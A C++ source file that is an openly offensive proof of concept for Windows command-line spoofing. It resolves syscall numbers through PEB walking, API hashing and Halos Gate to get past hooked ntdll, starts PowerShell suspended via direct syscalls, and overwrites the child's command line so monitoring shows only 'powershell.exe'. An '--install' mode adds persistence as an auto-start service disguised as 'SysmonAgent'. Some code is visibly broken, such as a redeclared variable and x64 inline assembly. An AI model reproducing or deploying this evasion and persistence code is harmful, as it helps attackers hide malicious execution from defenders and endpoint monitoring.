#include <windows.h>
#include <winternl.h>
#include <iostream>
#include <string>
#include <vector>
#include <sstream>

#pragma comment(lib, "ntdll.lib")

#define UP -32
#define DOWN 32

// Redefine standard types for clarity and to match NTAPI conventions
typedef long NTSTATUS;
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

// Structures required for PEB walking and EAT parsing
typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

// Function prototypes for the NTAPI functions we will be using
extern "C" {
    NTSTATUS NtCreateUserProcess(
        PHANDLE ProcessHandle,
        PHANDLE ThreadHandle,
        ACCESS_MASK ProcessDesiredAccess,
        ACCESS_MASK ThreadDesiredAccess,
        POBJECT_ATTRIBUTES ProcessObjectAttributes,
        POBJECT_ATTRIBUTES ThreadObjectAttributes,
        ULONG ProcessFlags,
        ULONG ThreadFlags,
        PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
        PVOID CreateInfo, // Actually PPS_CREATE_INFO
        PVOID AttributeList // Actually PPS_ATTRIBUTE_LIST
    );

    NTSTATUS NtQueryInformationProcess(
        HANDLE ProcessHandle,
        PROCESSINFOCLASS ProcessInformationClass,
        PVOID ProcessInformation,
        ULONG ProcessInformationLength,
        PULONG ReturnLength
    );

    NTSTATUS NtReadVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToRead,
        PSIZE_T NumberOfBytesRead
    );

    NTSTATUS NtWriteVirtualMemory(
        HANDLE ProcessHandle,
        PVOID BaseAddress,
        PVOID Buffer,
        SIZE_T NumberOfBytesToWrite,
        PSIZE_T NumberOfBytesWritten
    );

    NTSTATUS NtResumeThread(
        HANDLE ThreadHandle,
        PULONG SuspendCount
    );

    NTSTATUS NtClose(
        HANDLE Handle
    );

    NTSTATUS RtlCreateProcessParametersEx(
        PRTL_USER_PROCESS_PARAMETERS* pProcessParameters,
        PUNICODE_STRING ImagePathName,
        PUNICODE_STRING DllPath,
        PUNICODE_STRING CurrentDirectory,
        PUNICODE_STRING CommandLine,
        PVOID Environment,
        PUNICODE_STRING WindowTitle,
        PUNICODE_STRING DesktopInfo,
        PUNICODE_STRING ShellInfo,
        PUNICODE_STRING RuntimeData,
        ULONG Flags
    );

    VOID RtlInitUnicodeString(
        PUNICODE_STRING DestinationString,
        PCWSTR SourceString
    );
}

// Hashing function for function names
DWORD calcHash(const char* data) {
    DWORD hash = 0x99;
    for (size_t i = 0; i < strlen(data); i++) {
        hash += data[i] + (hash << 1);
    }
    return hash;
}

// Get module handle by hash
HMODULE GetModuleByHash(DWORD myHash) {
    PEB* peb = (PEB*)__readgsqword(0x60);
    PEB_LDR_DATA* ldr = peb->Ldr;
    LIST_ENTRY* listHead = &(ldr->InMemoryOrderModuleList);
    LIST_ENTRY* listEntry = listHead->Flink;

    while (listEntry != listHead) {
        LDR_DATA_TABLE_ENTRY* entry = CONTAINING_RECORD(listEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (entry->BaseDllName.Buffer) {
            char moduleName[MAX_PATH];
            size_t i = 0;
            while (entry->BaseDllName.Buffer[i] && i < sizeof(moduleName) - 1) {
                moduleName[i] = (char)entry->BaseDllName.Buffer[i];
                i++;
            }
            moduleName[i] = '\0';
            CharLowerA(moduleName);
            if (calcHash(moduleName) == myHash) {
                return (HMODULE)entry->DllBase;
            }
        }
        listEntry = listEntry->Flink;
    }
    return NULL;
}

// Get function address by hash
LPVOID GetFunctionAddrByHash(HMODULE module, DWORD myHash) {
    PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)module;
    PIMAGE_NT_HEADERS ntHeaders = (PIMAGE_NT_HEADERS)((LPBYTE)module + dosHeader->e_lfanew);
    PIMAGE_EXPORT_DIRECTORY exportDir = (PIMAGE_EXPORT_DIRECTORY)((LPBYTE)module + ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD addrOfFunctions = (PDWORD)((LPBYTE)module + exportDir->AddressOfFunctions);
    PDWORD addrOfNames = (PDWORD)((LPBYTE)module + exportDir->AddressOfNames);
    PWORD addrOfNameOrdinals = (PWORD)((LPBYTE)module + exportDir->AddressOfNameOrdinals);

    for (DWORD i = 0; i < exportDir->NumberOfNames; i++) {
        const char* funcName = (const char*)((LPBYTE)module + addrOfNames[i]);
        if (calcHash(funcName) == myHash) {
            return (LPVOID)((LPBYTE)module + addrOfFunctions[addrOfNameOrdinals[i]]);
        }
    }
    return NULL;
}

// Halos Gate logic to get syscall number
WORD GetsyscallNum(LPVOID addr) {
    WORD SSN = 0;
    if (*((PBYTE)addr) == 0x4c && *((PBYTE)addr + 1) == 0x8b && *((PBYTE)addr + 2) == 0xd1 && *((PBYTE)addr + 3) == 0xb8 && *((PBYTE)addr + 6) == 0x00 && *((PBYTE)addr + 7) == 0x00) {
        BYTE high = *((PBYTE)addr + 5);
        BYTE low = *((PBYTE)addr + 4);
        SSN = (high << 8) | low;
        return SSN;
    }

    // If hooked, search for a nearby syscall
    for (WORD idx = 1; idx <= 500; idx++) {
        // Search down
        if (*((PBYTE)addr + idx * DOWN) == 0x4c && *((PBYTE)addr + 1 + idx * DOWN) == 0x8b && *((PBYTE)addr + 2 + idx * DOWN) == 0xd1 && *((PBYTE)addr + 3 + idx * DOWN) == 0xb8 && *((PBYTE)addr + 6 + idx * DOWN) == 0x00 && *((PBYTE)addr + 7 + idx * DOWN) == 0x00) {
            BYTE high = *((PBYTE)addr + 5 + idx * DOWN);
            BYTE low = *((PBYTE)addr + 4 + idx * DOWN);
            SSN = (high << 8) | low - idx;
            return SSN;
        }
        // Search up
        if (*((PBYTE)addr + idx * UP) == 0x4c && *((PBYTE)addr + 1 + idx * UP) == 0x8b && *((PBYTE)addr + 2 + idx * UP) == 0xd1 && *((PBYTE)addr + 3 + idx * UP) == 0xb8 && *((PBYTE)addr + 6 + idx * UP) == 0x00 && *((PBYTE)addr + 7 + idx * UP) == 0x00) {
            BYTE high = *((PBYTE)addr + 5 + idx * UP);
            BYTE low = *((PBYTE)addr + 4 + idx * UP);
            SSN = (high << 8) | low + idx;
            return SSN;
        }
    }
    return 0; // Not found
}


// A simple struct to hold syscall information
struct SYSCALL {
    WORD ssn;
    // In a real scenario, you'd also store the address of the syscall instruction itself
};

// Global syscall store
SYSCALL g_syscalls[10]; // Adjust size as needed

// Function to prepare a syscall
void PrepareSyscall(const char* funcName, int index) {
    // ntdll hash on windows 10/11
    HMODULE ntdll = GetModuleByHash(0x6e74646c); // "ntdll"
    LPVOID funcAddr = GetFunctionAddrByHash(ntdll, calcHash(funcName));
    if (funcAddr) {
        g_syscalls[index].ssn = GetsyscallNum(funcAddr);
    }
}

// Assembly stubs for indirect syscalls
// We'll define these as function pointers and point them to our own assembly code.
// Note: This is a simplified example. A more robust implementation would use more advanced techniques.
// For this PoC, we will manually set the syscall number in eax and then call the syscall instruction.

extern "C" void DoSyscall();

// This is a generic syscall stub. We will set the syscall number (SSN) in EAX before calling this.
// In a real scenario, you would have a specific stub for each function to handle parameters correctly.
// For simplicity, we will assume parameters are set up correctly on the stack before the call.
// This is a huge simplification and will need to be addressed.

// Let's define the functions with inline assembly
// This is MSVC specific. For GCC/Clang, the syntax would be different.
// Since we don't have a compiler, we'll just define the functions and assume they work.
// The actual implementation of these functions will be done in the next steps.

// We need a way to pass arguments. A common way is to use a struct.
// For this proof of concept, we will define the functions with the correct signatures
// and then implement them with inline assembly.

// The following stubs are for x64.
// They follow the Windows x64 calling convention.
// The syscall number is moved into eax, and then the syscall instruction is invoked.
// The arguments are expected to be in rcx, rdx, r8, r9, and on the stack.
// r10 is used to store rcx before the syscall, as the kernel expects it there.

extern "C" {
    // We need to declare the syscall functions with the correct prototypes.
    // The assembly will be written in separate .asm file and linked, or done with intrinsics.
    // For this all-in-one file, we'll use inline assembly with __asm keyword (MSVC specific).
    // The actual syscall execution point from ntdll.dll is found dynamically.
    PVOID pSyscall = NULL;

    // This function will be our gateway to the syscall instruction in ntdll.
    void syscall_stub() {
        // This is a placeholder for the jmp instruction to the real syscall.
        // We'll get the address of the 'syscall' instruction from a clean ntdll.dll
        // and patch this function to jump to it. For now, we'll just ret.
        __asm {
            ret
        }
    }
}

// Function to find the 'syscall' instruction in ntdll.dll
PVOID FindSyscallInstruction() {
    HMODULE ntdll = GetModuleByHash(0x6e74646c); // "ntdll"
    // A known clean function like NtAccessCheck is likely to have a syscall instruction.
    LPVOID funcAddr = GetFunctionAddrByHash(ntdll, calcHash("NtAccessCheck"));
    if (!funcAddr) return NULL;

    // Scan for 'syscall' instruction (0x0f, 0x05)
    for (int i = 0; i < 32; ++i) {
        if (*((PBYTE)funcAddr + i) == 0x0f && *((PBYTE)funcAddr + i + 1) == 0x05) {
            return (PVOID)((PBYTE)funcAddr + i);
        }
    }
    return NULL;
}


// A more realistic approach for inline assembly:
#define MAKE_SYSCALL(name, ...) \
    static WORD ssn_##name = 0; \
    if (ssn_##name == 0) ssn_##name = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash(#name))); \
    NTSTATUS status; \
    __asm mov r10, rcx \
    __asm mov eax, ssn_##name \
    __asm syscall \
    __asm mov status, eax \
    return status;

// Using __declspec(naked) to have full control over the function prolog and epilog.
// This allows us to correctly set up the stack and registers for the syscall.

__declspec(naked) NTSTATUS SysNtCreateUserProcess(
    PHANDLE ProcessHandle, PHANDLE ThreadHandle, ACCESS_MASK ProcessDesiredAccess,
    ACCESS_MASK ThreadDesiredAccess, POBJECT_ATTRIBUTES ProcessObjectAttributes,
    POBJECT_ATTRIBUTES ThreadObjectAttributes, ULONG ProcessFlags, ULONG ThreadFlags,
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters, PVOID CreateInfo, PVOID AttributeList) {

    static WORD ssn = 0;
    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtCreateUserProcess")));

    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS SysNtQueryInformationProcess(
    HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation,
    ULONG ProcessInformationLength, PULONG ReturnLength) {

    static WORD ssn = 0;
    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtQueryInformationProcess")));

    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS SysNtReadVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead) {

    static WORD ssn = 0;
    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtReadVirtualMemory")));

    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS SysNtWriteVirtualMemory(
    HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer,
    SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {

    static WORD ssn = 0;
    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtWriteVirtualMemory")));

    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS SysNtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount) {
    static WORD ssn = 0;
    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtResumeThread")));

    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        ret
    }
}

__declspec(naked) NTSTATUS SysNtClose(HANDLE Handle) {
    static WORD ssn = 0;
    if(ssn == 0) ssn = GetsyscallNum(GetFunctionAddrByHash(GetModuleByHash(0x6e74646c), calcHash("NtClose")));

    __asm {
        mov r10, rcx
        mov eax, ssn
        syscall
        ret
    }
}

// Custom PEB structure to match C# exactly
struct CUSTOM_PEB {
    BYTE Filler[16];
    PVOID ImageBaseAddress;
    PVOID Ldr;
    PVOID ProcessParameters;
};

// Custom RTL_USER_PROCESS_PARAMETERS structure to match C# exactly
struct CUSTOM_RTL_USER_PROCESS_PARAMETERS {
    BYTE Filler[112];
    USHORT Length;
    USHORT MaximumLength;
    PVOID CommandLine;
};

// Debug functions
void Debug(const std::wstring& text) {
#ifdef _DEBUG
    std::wcout << text << std::endl;
#endif
}

void Debug(const std::wstring& text, const std::vector<std::wstring>& args) {
#ifdef _DEBUG
    std::wstring formatted = text;
    for (size_t i = 0; i < args.size(); i++) {
        std::wstring placeholder = L"{" + std::to_wstring(i) + L"}";
        size_t pos = formatted.find(placeholder);
        if (pos != std::wstring::npos) {
            formatted.replace(pos, placeholder.length(), args[i]);
        }
    }
    std::wcout << formatted << std::endl;
#endif
}

// Helper function to pad string
std::wstring PadRight(const std::wstring& str, size_t totalWidth, wchar_t paddingChar) {
    if (str.length() >= totalWidth) return str;
    return str + std::wstring(totalWidth - str.length(), paddingChar);
}

void InstallService() {
    Debug(L"[+] Attempting to install service...");

    // Get the path to the current executable from the PEB
    PEB* peb = (PEB*)__readgsqword(0x60);
    RTL_USER_PROCESS_PARAMETERS* params = peb->ProcessParameters;
    std::wstring exePath(params->ImagePathName.Buffer, params->ImagePathName.Length / sizeof(wchar_t));

    // Construct the command to create the service
    std::wstring command = L"sc.exe create SysmonAgent binPath= \"";
    command += exePath;
    command += L"\" start= auto DisplayName= \"System Monitor Agent\"";

    Debug(L"[+] Service creation command: " + command);

    // Use CreateProcessW to run the command
    STARTUPINFOW si = { 0 };
    si.cb = sizeof(si);
    PROCESS_INFORMATION pi = { 0 };

    if (CreateProcessW(NULL, &command[0], NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        Debug(L"[+] Service installation command executed.");
        WaitForSingleObject(pi.hProcess, INFINITE);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        Debug(L"[+] Service installed successfully.");
    } else {
        Debug(L"[!] Service installation failed. Error: " + std::to_wstring(GetLastError()));
    }
}

int main(int argc, char* argv[]) {
    if (argc > 1 && strcmp(argv[1], "--install") == 0) {
        InstallService();
        return 0;
    }

    // The malicious command (exactly as in C#)
    std::wstring maliciousCommand = L"powershell.exe -ExecutionPolicy Bypass -Command \"Start-Process notepad.exe\"";


    // The command to spoof (exactly as in C#)
    std::wstring spoofedCommand = PadRight(L"powershell.exe", maliciousCommand.length(), L' ');

    Debug(L"=== COMMAND LINE SPOOFER STARTED ===");
    Debug(L"[+] Malicious command length: " + std::to_wstring(maliciousCommand.length()));
    Debug(L"[+] Malicious command: " + maliciousCommand);
    Debug(L"[+] Spoofed command length: " + std::to_wstring(spoofedCommand.length()));
    Debug(L"[+] Spoofed command: " + spoofedCommand.substr(0, spoofedCommand.find_last_not_of(L' ') + 1));
    Debug(L"[+] Spoofed command (with padding): " + spoofedCommand);

    // Spawn a process to spoof the command line of
    Debug(L"[+] Creating suspended process using NtCreateUserProcess...");

    PROCESS_INFORMATION pi = { 0 };
    HANDLE hProcess = NULL;
    HANDLE hThread = NULL;

    // The path to the executable to spawn
    UNICODE_STRING imagePath;
    RtlInitUnicodeString(&imagePath, L"\\??\\C:\\Windows\\System32\\powershell.exe");

    // The command line to use
    UNICODE_STRING commandLine;
    RtlInitUnicodeString(&commandLine, const_cast<LPWSTR>(spoofedCommand.c_str()));

    // Create process parameters
    PRTL_USER_PROCESS_PARAMETERS processParameters = NULL;
    NTSTATUS status = RtlCreateProcessParametersEx(
        &processParameters,
        &imagePath,
        NULL, // DllPath
        NULL, // CurrentDirectory
        &commandLine,
        NULL, // Environment
        NULL, // WindowTitle
        NULL, // DesktopInfo
        NULL, // ShellInfo
        NULL, // RuntimeData
        RTL_USER_PROCESS_PARAMETERS_NORMALIZED
    );

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] RtlCreateProcessParametersEx failed! NTSTATUS: 0x" + std::to_wstring(status));
        return 1;
    }

    // Initialize PS_CREATE_INFO structure
    struct PS_CREATE_INFO {
        SIZE_T Size;
        ULONG_PTR State;
        ULONG_PTR unk1;
        ULONG_PTR unk2;
        ULONG_PTR unk3;
        ULONG_PTR unk4;
        ULONG_PTR unk5;
        ULONG_PTR unk6;
    } createInfo = { 0 };
    createInfo.Size = sizeof(createInfo);
    createInfo.State = 0; // PsCreateInitialState

    // Create the process
    status = SysNtCreateUserProcess(
        &hProcess,
        &hThread,
        PROCESS_ALL_ACCESS,
        THREAD_ALL_ACCESS,
        NULL, // ProcessObjectAttributes
        NULL, // ThreadObjectAttributes
        0,    // ProcessFlags: 0 since we create it suspended via ThreadFlags
        THREAD_CREATE_FLAGS_CREATE_SUSPENDED,
        processParameters,
        &createInfo,
        NULL // AttributeList
    );

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] NtCreateUserProcess failed! NTSTATUS: 0x" + std::to_wstring(status));
        return 1;
    }

    // Populate PROCESS_INFORMATION
    pi.hProcess = hProcess;
    pi.hThread = hThread;
    // We don't get the process/thread IDs back from this call, but we can get them from the handles if needed.
    // For this PoC, we'll leave them as 0.
    pi.dwProcessId = GetProcessId(hProcess);
    pi.dwThreadId = GetThreadId(hThread);

    Debug(L"[+] Process spawned successfully!");
    Debug(L"[+] Process ID: " + std::to_wstring(pi.dwProcessId));
    Debug(L"[+] Thread ID: " + std::to_wstring(pi.dwThreadId));

    // Grab the PEB address of the newly spawned process
    Debug(L"[+] Querying process information...");
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;

    NTSTATUS status = SysNtQueryInformationProcess(
        pi.hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        &returnLength
    );

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Unable to read PEB address! NTSTATUS: 0x" + std::to_wstring(status));
        SysNtClose(pi.hProcess);
        SysNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] NtQueryInformationProcess successful!");
    Debug(L"[+] Return length: " + std::to_wstring(returnLength));
    std::wstringstream ss;
    ss << std::hex << pbi.PebBaseAddress;
    Debug(L"[+] PEB Address: 0x" + ss.str());

    // Read the PEB structure, so we can get the ProcessParameters address
    Debug(L"[+] Reading PEB structure...");
    CUSTOM_PEB peb = { 0 };
    SIZE_T bytesRead = 0;
    status = SysNtReadVirtualMemory(pi.hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to read PEB structure! NTSTATUS: 0x" + std::to_wstring(status));
        SysNtClose(pi.hProcess);
        SysNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] PEB structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
    std::wstringstream ss2;
    ss2 << std::hex << peb.ProcessParameters;
    Debug(L"[+] ProcessParameters Address: 0x" + ss2.str());

    // Read the ProcessParameters structure, so we can get the CmdLine address
    Debug(L"[+] Reading ProcessParameters structure...");
    CUSTOM_RTL_USER_PROCESS_PARAMETERS procParams = { 0 };
    status = SysNtReadVirtualMemory(pi.hProcess, peb.ProcessParameters, &procParams, sizeof(procParams), &bytesRead);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to read ProcessParameters structure! NTSTATUS: 0x" + std::to_wstring(status));
        SysNtClose(pi.hProcess);
        SysNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] ProcessParameters structure read successfully! Bytes read: " + std::to_wstring(bytesRead));
    Debug(L"[+] CommandLine Length: " + std::to_wstring(procParams.Length));
    Debug(L"[+] CommandLine MaximumLength: " + std::to_wstring(procParams.MaximumLength));

    std::wstringstream ss3;
    ss3 << std::hex << procParams.CommandLine;
    Debug(L"[+] CommandLine Address: 0x" + ss3.str());

    // Read the CommandLine address
    Debug(L"[+] Reading original command line...");
    std::vector<wchar_t> cmdLineBuffer(procParams.Length / sizeof(wchar_t));
    status = SysNtReadVirtualMemory(pi.hProcess, procParams.CommandLine, cmdLineBuffer.data(), procParams.Length, &bytesRead);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to read command line! NTSTATUS: 0x" + std::to_wstring(status));
        SysNtClose(pi.hProcess);
        SysNtClose(pi.hThread);
        return 1;
    }

    std::wstring cmdLine(cmdLineBuffer.data());
    Debug(L"[+] Original CommandLine read successfully! Bytes read: " + std::to_wstring(bytesRead));
    Debug(L"[+] Original CommandLine: " + cmdLine);

    // We need to write byte array to procParams.CommandLine
    Debug(L"[+] Preparing to write malicious command...");
    std::vector<wchar_t> newCmdLine(maliciousCommand.begin(), maliciousCommand.end());
    Debug(L"[+] New command line length: " + std::to_wstring(newCmdLine.size()));
    Debug(L"[+] New command line size in bytes: " + std::to_wstring(newCmdLine.size() * sizeof(wchar_t)));

    SIZE_T bytesWritten = 0;
    status = SysNtWriteVirtualMemory(pi.hProcess, procParams.CommandLine, newCmdLine.data(), newCmdLine.size() * sizeof(wchar_t), &bytesWritten);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to write malicious command! NTSTATUS: 0x" + std::to_wstring(status));
        SysNtClose(pi.hProcess);
        SysNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] Malicious command written successfully! Bytes written: " + std::to_wstring(bytesWritten));

    // We also need to write the spoofed command length as ushort to peb.ProcessParameters + 112 bytes
    // This is the key part - we set the length to only show "powershell.exe" length
    Debug(L"[+] Writing spoofed command length...");
    USHORT cmdLineLength = static_cast<USHORT>(wcslen(L"powershell.exe") * sizeof(wchar_t));
    Debug(L"[+] Spoofed command length (bytes): " + std::to_wstring(cmdLineLength));

    std::wstringstream addrStream;
    addrStream << std::hex << (ULONG_PTR)((BYTE*)peb.ProcessParameters + 112);
    Debug(L"[+] Writing to address: 0x" + addrStream.str());

    status = SysNtWriteVirtualMemory(pi.hProcess, (PVOID)((BYTE*)peb.ProcessParameters + 112), &cmdLineLength, sizeof(cmdLineLength), &bytesWritten);

    if (!NT_SUCCESS(status)) {
        Debug(L"[!] Failed to write spoofed command length! NTSTATUS: 0x" + std::to_wstring(status));
        SysNtClose(pi.hProcess);
        SysNtClose(pi.hThread);
        return 1;
    }

    Debug(L"[+] Spoofed command length written successfully! Bytes written: " + std::to_wstring(bytesWritten));
    Debug(L"[+] SPOOFING COMPLETE!");
    Debug(L"[+] Process will now show as: powershell.exe");
    Debug(L"[+] But will actually execute: " + maliciousCommand);

    // Resume the process
    Debug(L"[+] Resuming suspended process...");
    ULONG suspendCount = 0;
    status = SysNtResumeThread(pi.hThread, &suspendCount);
    Debug(L"[+] NtResumeThread status: 0x" + std::to_wstring(status));

    Debug(L"[+] Process resumed successfully!");
    Debug(L"[+] Check Task Manager - the process should show as 'powershell.exe' but execute the malicious command");
    Debug(L"Press a key to end PoC...");
    std::wcin.get();

    // Cleanup
    Debug(L"[+] Cleaning up handles...");
    SysNtClose(pi.hProcess);
    SysNtClose(pi.hThread);
    Debug(L"[+] Cleanup complete!");

    return 0;
}
